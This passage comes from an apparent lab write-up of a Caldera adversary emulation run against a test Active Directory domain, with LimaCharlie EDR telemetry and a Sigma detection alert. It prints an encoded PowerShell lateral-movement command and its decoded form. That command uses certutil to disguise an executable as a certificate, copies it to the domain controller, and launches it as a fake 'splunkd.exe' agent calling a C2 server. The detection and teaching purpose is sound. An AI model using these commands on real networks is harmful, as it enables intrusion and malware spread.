</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span><span style=color:#f1fa8c>&#34;this&#34;</span>:<span style=color:#f1fa8c>&#34;838ade81151b59202d3a885468de612c&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span><span style=color:#f1fa8c>&#34;detect_id&#34;</span>:<span style=color:#f1fa8c>&#34;60b6fbaf-3a72-4e62-8297-076968de612b&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span><span style=color:#f1fa8c>&#34;detect_mtd&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span><span style=color:#ff79c6>&#34;author&#34;</span>:<span style=color:#f1fa8c>&#34;frack113&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span><span style=color:#f1fa8c>&#34;description&#34;</span>:<span style=color:#f1fa8c>&#34;Detects changing the PowerShell script execution policy to a potentially insecure level using the &#34;</span>-ExecutionPolicy<span style=color:#f1fa8c>&#34; flag.&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span><span style=color:#f1fa8c>&#34;falsepositives&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span><span style=color:#f1fa8c>&#34;Administrator scripts&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span><span style=color:#f1fa8c>&#34;level&#34;</span>:<span style=color:#f1fa8c>&#34;medium&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span><span style=color:#f1fa8c>&#34;references&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span><span style=color:#f1fa8c>&#34;https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-7.4&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span><span style=color:#f1fa8c>&#34;https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.4&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span><span style=color:#f1fa8c>&#34;https://adsecurity.org/?p=2604&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span><span style=color:#f1fa8c>&#34;https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span><span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span><span style=color:#f1fa8c>&#34;tags&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span><span><span style=color:#f1fa8c>&#34;attack.execution&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span><span><span style=color:#f1fa8c>&#34;attack.t1059.001&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span><span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span><span><span style=color:#f1fa8c>&#34;gen_time&#34;</span>:<span style=color:#bd93f9>1759404331754</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span><span><span style=color:#f1fa8c>&#34;link&#34;</span>:<span style=color:#f1fa8c>&#34;https://app.limacharlie.io/orgs/c73795e0-a62c-4854-9462-be3d08769aa1/sensors/23bf4a39-63f5-4808-8a3a-772460439fe4/timeline?time=1759404331&amp;selected=838ade81151b59202d3a885468de612c&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span><span><span style=color:#f1fa8c>&#34;namespace&#34;</span>:<span style=color:#f1fa8c>&#34;general&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span><span style=color:#f1fa8c>&#34;rule_tags&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77</span><span><span style=color:#f1fa8c>&#34;ext:ext-sigma&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78</span><span><span style=color:#f1fa8c>&#34;attack.execution&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79</span><span><span style=color:#f1fa8c>&#34;attack.t1059.001&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80</span><span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81</span><span><span style=color:#f1fa8c>&#34;source&#34;</span>:<span style=color:#f1fa8c>&#34;c73795e0-a62c-4854-9462-be3d08769aa1.9b03d810-e114-4352-9392-a1186feb7894.23bf4a39-63f5-4808-8a3a-772460439fe4.10000000.2&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82</span><span><span style=color:#f1fa8c>&#34;source_rule&#34;</span>:<span style=color:#f1fa8c>&#34;service.windows_process_creation/proc_creation_win_powershell_set_policies_to_unsecure_level&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83</span><span><span style=color:#f1fa8c>&#34;ts&#34;</span>:<span style=color:#bd93f9>1759404331000</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84</span><span>}
</span></span></code></pre></div><h2 id=step-3-lateral-movement---certutil><strong>Step 3: Lateral Movement - Certutil</strong></h2><pre tabindex=0><code>Tactic: Lateral Movement
Technique Name: Lateral Tool Transfer
Technique ID: T1570
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>powershell -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGUAcgBzAFwAcAB1AGIAbABpAGMAXABjAG8AbQAuAGMAcgB0ACAAfAAgAG8AdQB0AC0AbgB1AGwAbAA7AGkAbgB2AG8AawBlAC0AYwBvAG0AbQBhAG4AZAAgAGEAZAAtAGQAYwAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbAAgAC0AcwBjAHIAaQBwAHQAYgBsAG8AYwBrACAAewAgAGMAZQByAHQAdQB0AGkAbAAgAC0AZABlAGMAbwBkAGUAIABcAFwAYwBsAGkAZQBuAHQAMQAuAHMAcwBuAHIAcwBoAG4AbgAuAGwAbwBjAGEAbABcAGMAJABcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAYwBvAG0ALgBjAHIAdAAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlADsAIABpAG4AdgBvAGsAZQAtAHcAbQBpAG0AZQB0AGgAbwBkACAALQBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQAgAC4AIAAtAGMAbABhAHMAcwAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAG4AYQBtAGUAIABDAHIAZQBhAHQAZQAgAC0AYQByAGcAdQBtAGUAbgB0AGwAaQBzAHQAIAAiAEMAOgBcAHUAcwBlAHIAcwBcAHAAdQBiAGwAaQBjAFwAcwBwAGwAdQBuAGsAZAAuAGUAeABlACAALQBzAGUAcgB2AGUAcgAgAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAuADQALgA0ADAAOgA4ADgAOAA4ACAALQBnAHIAbwB1AHAAIAByAGUAZAAiACAAfQA=
</span></span></code></pre></div><p><strong>Decoded:</strong></p><pre tabindex=0><code>certutil -encode #{location} C:\users\public\com.crt | out-null;
invoke-command #{remote.host.fqdn} -scriptblock { certutil -decode \\#{local.host.fqdn}\c$\users\public\com.crt #{location}; invoke-wmimethod -computername . -class win32_process -name Create -argumentlist &#34;C:\users\public\splunkd.exe -server #{server} -group red&#34; }
</code></pre><p><strong>Command Output:</strong></p><pre tabindex=0><code>Input Length = 8778940
Output Length = 6384640
CertUtil: -decode command completed successfully.


PSComputerName   : ad-dc.ssnrshnn.local
RunspaceId       : 841b23d1-7ece-4772-8897-bf2ab067596e
__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     : 
__DYNASTY        : __PARAMETERS
__RELPATH        : 
__PROPERTY_COUNT : 2
__DERIVATION     : {}
__SERVER         : 
__NAMESPACE      : 
__PATH           : 
ProcessId        : 
ReturnValue      : 9
</code></pre><p>The attacker&rsquo;s aim here is to transfer and execute malware across systems in a network.</p><p><strong>Attack Flow:</strong></p><p><strong>Step 1: Encoding the malware</strong></p><pre tabindex=0><code>certutil -encode C:\Users\Public\Client1.exe C:\users\public\com.crt
</code></pre><ul><li>Takes an executable (<code>Client1.exe</code>) and encodes it to Base64</li><li>Saves it as <code>com.crt</code> (disguised as a certificate file to avoid detection)</li></ul><p><img src=/images/calderacertutil/10.1.png alt=certutil></p><p><img src=/images/calderacertutil/10.2.png alt=certutil></p><p><img src=/images/calderacertutil/10.png alt=certutil></p><p><strong>Step 2: Remote execution on the Domain Controller</strong></p><pre tabindex=0><code>invoke-command ad-dc.ssnrshnn.local -scriptblock { ... }
</code></pre><ul><li>Executes commands remotely on the domain controller (<code>ad-dc.ssnrshnn.local</code>)</li><li>This requires administrative privileges</li></ul><p><img src=/images/calderacertutil/13.png alt=certutil></p><p><img src=/images/calderacertutil/14.png alt=certutil></p><p><strong>Step 3: Decoding on the target</strong></p><pre tabindex=0><code>certutil -decode \\client1.ssnrshnn.local\c$\users\public\com.crt C:\Users\Public\Client1.exe
</code></pre><ul><li>Accesses the encoded file via network share from client1</li><li>Decodes it back to an executable on the domain controller</li></ul><p><strong>ad-dc</strong></p><p><img src=/images/calderacertutil/11.png alt=certutil></p><p>Process tree view:</p><p><img src=/images/calderacertutil/12.png alt=certutil></p><p><img src=/images/calderacertutil/15.png alt=certutil></p><p>Detections:</p><p><img src=/images/calderacertutil/16.png alt=certutil></p><p><strong>Step 4: Executing the payload</strong></p><pre tabindex=0><code>invoke-wmimethod -computername . -class win32_process -name Create -argumentlist &#34;C:\users\public\splunkd.exe...&#34;
</code></pre><ul><li>Uses WMI to spawn a new process (disguised as <code>splunkd.exe</code> - mimicking Splunk&rsquo;s legitimate process)</li></ul><p><strong>LimaCharlie:</strong></p><p>Here you can see the third malicious process that has been created by Caldera as Step 3.</p><p><img src=/images/calderacertutil/8.png alt=certutil></p><p>In the process tree view we can see that this process looks a bit different than the former ones.</p><p><img src=/images/calderacertutil/9.png alt=certutil></p><p>Parent process:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;event&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGUAcgBzA…<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#34;</span>FILE_IS_SIGNED<span style=color:#f1fa8c>&#34;:1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>&#34;</span>FILE_PATH<span style=color:#f1fa8c>&#34;:&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>&#34;</span>HASH<span style=color:#f1fa8c>&#34;:&#34;</span>9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>&#34;</span>MEMORY_USAGE<span style=color:#f1fa8c>&#34;:54931456
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>&#34;</span>PARENT<span style=color:#f1fa8c>&#34;:{
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>&#34;</span>BASE_ADDRESS<span style=color:#f1fa8c>&#34;:12845056
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>&#34;</span>COMMAND_LINE<span style=color:#f1fa8c>&#34;:&#34;&#34;C:\Users\Public\Client1.exe&#34;</span> -server http://<span style=color:#bd93f9>10.1</span>.4.<span style=color:#bd93f9>40</span>:<span style=color:#bd93f9>8888</span> -group red <span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>&#34;</span>FILE_IS_SIGNED<span style=color:#f1fa8c>&#34;:0
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>&#34;</span>FILE_PATH<span style=color:#f1fa8c>&#34;:&#34;</span>C:\Users\Public\Client1.exe<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>&#34;</span>HASH<span style=color:#f1fa8c>&#34;:&#34;</span>2cd247e11809af2d9dab77b3afb7c87977871309783372a14277b719fa27f6a7<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>&#34;</span>MEMORY_USAGE<span style=color:#f1fa8c>&#34;:1306624
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>&#34;</span>PARENT_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>a76b164d14483ef2a0016dab68de5e69<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:9660
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:4272
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>&#34;</span>THIS_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>bbde0097323d5ef3b6dc604568de5e8c<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>&#34;</span>TIMESTAMP<span style=color:#f1fa8c>&#34;:1759403660323
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>}
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:4272
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:6016
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#f1fa8c>&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:19
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#f1fa8c>&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#f1fa8c>}
</span></span></span></code></pre></div><p>Child process:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;event&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34; -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGU…&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>61292544</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>&#34;PARENT&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc YwBlAHIAdAB1AHQAaQBsACAALQBlAG4AYwBvAGQAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAQwBsAGkAZQBuAHQAMQAuAGUAeABlACAAQwA6AFwAdQBzAGUAcgBzA…<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>&#34;</span>FILE_IS_SIGNED<span style=color:#f1fa8c>&#34;:1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>&#34;</span>FILE_PATH<span style=color:#f1fa8c>&#34;:&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>&#34;</span>HASH<span style=color:#f1fa8c>&#34;:&#34;</span>9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>&#34;</span>MEMORY_USAGE<span style=color:#f1fa8c>&#34;:54931456
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>&#34;</span>PARENT_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>bbde0097323d5ef3b6dc604568de5e8c<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:4272
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:6016
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>&#34;</span>THIS_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>f1172e538d9a0937687748e868de6194<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:19
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>&#34;</span>TIMESTAMP<span style=color:#f1fa8c>&#34;:1759404435957
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>}
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:6016
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:5276
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#f1fa8c>&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:19
